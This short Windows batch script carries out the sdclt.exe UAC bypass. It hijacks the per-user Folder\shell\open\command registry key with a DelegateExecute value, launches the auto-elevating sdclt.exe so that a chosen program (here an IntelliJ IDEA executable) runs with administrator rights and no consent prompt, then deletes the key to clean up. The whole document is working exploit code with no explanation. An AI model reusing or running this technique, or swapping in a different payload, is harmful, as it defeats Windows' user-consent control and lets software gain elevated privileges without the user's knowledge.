reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "D:\Program Files\ideaIU-2019.2.3.win\bin\idea64.exe" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
timeout /t 5
%windir%\system32\sdclt.exe
timeout /t 5
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f